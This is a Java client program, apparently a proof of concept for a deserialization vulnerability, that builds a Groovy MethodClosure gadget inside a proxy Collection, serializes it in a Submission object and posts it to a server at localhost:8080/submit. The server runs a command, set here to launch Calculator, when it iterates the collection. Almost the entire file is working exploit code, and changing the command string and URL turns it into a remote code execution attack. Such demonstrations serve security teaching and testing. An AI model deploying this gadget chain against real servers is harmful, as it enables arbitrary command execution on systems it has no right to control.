package com.cisco.amp.client;

import com.cisco.amp.server.Submission;
import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import org.springframework.http.HttpEntity;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.util.ArrayList;
import java.util.Collection;

public class Client {

    //Change this string to be the relevant calculator on your system or whatever you like
    private static final String COMMAND = "/Applications/Calculator.app/Contents/MacOS/Calculator";

    private static Collection<String> makeNiceCollection() {
        Collection<String> niceCollection = new ArrayList<>();
        niceCollection.add("Hello World!");
        return niceCollection;
    }

    private static Collection<String> makeExploitCollection() {

        //Create a mock collection with the reflection api that only implements iterator which we know will be called on the server

        MethodClosure methodClosure = new MethodClosure(COMMAND, "execute");
        ConvertedClosure iteratorHandler = new ConvertedClosure(methodClosure, "iterator");

        Collection exploitCollection = (Collection) Proxy.newProxyInstance(
                Client.class.getClassLoader(), new Class<?>[]{Collection.class}, iteratorHandler
        );

        return exploitCollection;
    }

    public static void main(String[] args) throws IOException {
        //use makeNiceCollection or makeExploitCollection for normal or exploit operation respectively
        Submission submission = new Submission(makeExploitCollection());

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        new ObjectOutputStream(byteArrayOutputStream).writeObject(submission);
        byte[] bytes = byteArrayOutputStream.toByteArray();

        HttpEntity<byte[]> entity = new HttpEntity<>(bytes);
        RestTemplate restTemplate = new RestTemplate();
        ResponseEntity<String> response = restTemplate.postForEntity("http://localhost:8080/submit", entity, String.class);
        System.out.println(response.getBody());
    }
}
